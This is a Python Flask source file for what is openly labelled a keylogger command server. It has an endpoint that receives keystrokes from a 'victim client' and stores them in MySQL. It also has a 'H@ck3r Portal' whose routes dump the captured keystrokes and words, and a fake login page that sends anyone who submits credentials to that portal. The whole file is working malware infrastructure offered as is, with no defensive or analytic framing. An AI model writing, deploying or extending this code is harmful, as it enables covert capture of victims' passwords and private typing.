from flask import Flask, render_template, request, make_response, jsonify, redirect, url_for
import json
from json import JSONEncoder
import mysql.connector
from datetime import datetime
from process import Process
from load_config import load_cfg

#start flask app
app = Flask(__name__, template_folder='templates')

main_cfg = load_cfg('./main_cfg.json')

# Convert SQL datetime type to JSON readable format
def datetime_converter(o):
  if isinstance(o,datetime):
      return o.__str__()

#######################################
#                                     
#       Login page         
#                                     
#######################################
@app.route('/')
def hello():
    return render_template('index.html')
    
@app.route('/checkLogin', methods=['POST'])
def validate():
  username = request.form['username']
  password = request.form['password']
  
  if (username and password):
    print("NO!")
    return redirect(url_for('hacker'))


#######################################
#                                     
#       Send data from victim client to be processed            
#                                     
#######################################
@app.route('/pushKeys', methods=['POST'])
def addLog():
  data = json.loads(request.data)
  process = Process()

  for key in range(len(data)):      
    try:
      process.addKey(data[str(key)])
      

    except Exception as e:
      print("Exception:",e)

      return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
  return make_response(jsonify({'response': 'Success', 'code':200}), 200)

#######################################
#                                     
#         H@ck3r Portal            
#                                     
#######################################
@app.route('/hacker', methods=['GET'])
def hacker():
  return render_template('base.html')

@app.route('/showKeylog', methods=['GET'])
def pushKeylog():  
  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    port=main_cfg['port'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  
  mycursor = db.cursor()
  res = {}
  
  sql = f"SELECT * FROM {main_cfg['dbKeyTable']}"
  mycursor.execute(sql)
  res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
  res = json.dumps(res_query, default=datetime_converter)
  
  mycursor.close()
  db.close()
  
  return res

@app.route('/showWordlog', methods=['GET'])
def pushWordlog():  
  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    port=main_cfg['port'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  mycursor = db.cursor()
  res = {}
  
  sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
  mycursor.execute(sql)
  res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
  res = json.dumps(res_query, default=datetime_converter)
  
  mycursor.close()
  db.close()

  return res
  

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int("443"), debug=True)
